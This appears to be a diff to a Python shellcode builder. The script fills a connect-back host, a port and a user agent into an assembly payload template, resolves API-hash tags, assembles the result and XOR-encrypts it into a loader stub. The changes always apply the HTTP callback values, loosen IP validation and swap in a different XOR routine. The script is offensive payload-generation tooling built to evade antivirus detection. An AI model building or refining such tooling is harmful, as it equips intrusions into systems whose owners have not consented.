@@ -10,7 +10,7 @@ ROR_VALUE = config.getint("Payload", "ror_value")
 ENCRYPTION_BYTE = config.get("Payload", "encryption_byte")
 PAYLOAD_FILE = config.get("Payload", "filename")
 
-MODE = config.get("Payload","mode")
+# MODE = config.get("Payload","mode")
 LHOST = config.get("Payload", "lhost")
 LPORT = config.getint("Payload", "lport")
 USER_AGENT = config.get("Payload","user_agent")
@@ -22,7 +22,6 @@ WORKING_FOLDER = "temp/"
 
 def main():
     print("===========CONFIG==========")
-    print(f"Mode: {MODE}")
     print(f"ROR value: {ROR_VALUE}")
     print(f"Encryption byte: {ENCRYPTION_BYTE}")
     print("===========================\n")
@@ -30,13 +29,13 @@ def main():
     print("===========PAYLOAD==============")
     sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", hex(ROR_VALUE))
     
-    if "http" in MODE:
-        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
-        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST.replace('"',''))
-        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT.replace('"',''))
+    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
+    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST.replace('"',''))
+    sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT.replace('"',''))
 
-    if is_valid_ip(LHOST):
+    if LHOST.count(".") == 3:
         sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST__LPORT%", format_lhost_lport(LHOST,LPORT))
+
     remaining_tags = extract_tags_from_file(WORKING_FOLDER+PAYLOAD_FILE)
 
     # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
@@ -51,7 +50,6 @@ def main():
         if parts[0] == "STRING":
             pass #todo
 
-
     instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_FILE)
     nb_bytes = int(len(instructions)/2)
     print(f"Shellcode length: {nb_bytes} bytes")
@@ -62,7 +60,7 @@ def main():
         print("===========ENCRYPTION==============")
         print(instructions)
         print(f"\nEncrypted with '{ENCRYPTION_BYTE}'\n")
-        encrypted_instructions = xor_encrypt_decrypt(instructions, int(ENCRYPTION_BYTE, 16))
+        encrypted_instructions = xor2_encrypt_decrypt(instructions, int(ENCRYPTION_BYTE, 16))
         print(encrypted_instructions)
         print("===================================\n")
         sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(encrypted_instructions))
